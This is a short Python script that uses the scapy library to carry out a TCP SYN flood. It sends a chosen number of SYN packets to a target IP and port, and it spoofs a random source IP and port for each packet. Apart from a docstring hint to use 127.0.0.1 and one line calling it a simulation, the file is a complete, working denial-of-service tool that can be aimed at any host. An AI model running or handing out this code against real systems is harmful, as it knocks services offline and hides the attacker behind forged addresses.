# TCP SYN flood attack

from random import randint
from sys import stdout

from scapy.all import * # type: ignore
from scapy.layers.inet import IP, TCP # type: ignore

def tcp_syn_flood_attack(target_ip, target_port, num_requests):
    """
    Implements TCP SYN flood attack
    
    Args:
        target_ip (str): Target IP address (use 127.0.0.1 for testing)
        target_port (int): Target port number
        num_requests (int): Number of SYN packets to send
    """
    print(f"\nStarting TCP SYN flood attack simulation")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Number of packets to send: {num_requests}")
    
    # Counter for sent packets
    packets_sent = 0
    
    try:
        for i in range(num_requests):
            # Generate random source IP and port for each packet
            source_ip = f"{randint(1,254)}.{randint(1,254)}.{randint(1,254)}.{randint(1,254)}"
            source_port = randint(1024, 65535)
            
            # Create IP layer
            ip = IP(
                src=source_ip,  # Spoofed source IP
                dst=target_ip   # Target IP
            )
            
            # Create TCP layer with SYN flag
            tcp = TCP(
                sport=source_port,  # Spoofed source port
                dport=target_port,  # Target port
                flags="S",          # SYN flag
                seq=randint(1000, 9000)  # Random sequence number
            )
            
            # Combine layers and send the packet
            packet = ip/tcp
            send(packet, verbose=0) # type: ignore
            packets_sent += 1
            
            # Show progress
            if packets_sent % 100 == 0:
                print(f"Progress: {packets_sent}/{num_requests} packets sent", end='\r')
    
    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
    except Exception as e:
        print(f"\nError during attack: {e}")
    
    print(f"\nAttack completed - Total packets sent: {packets_sent}")
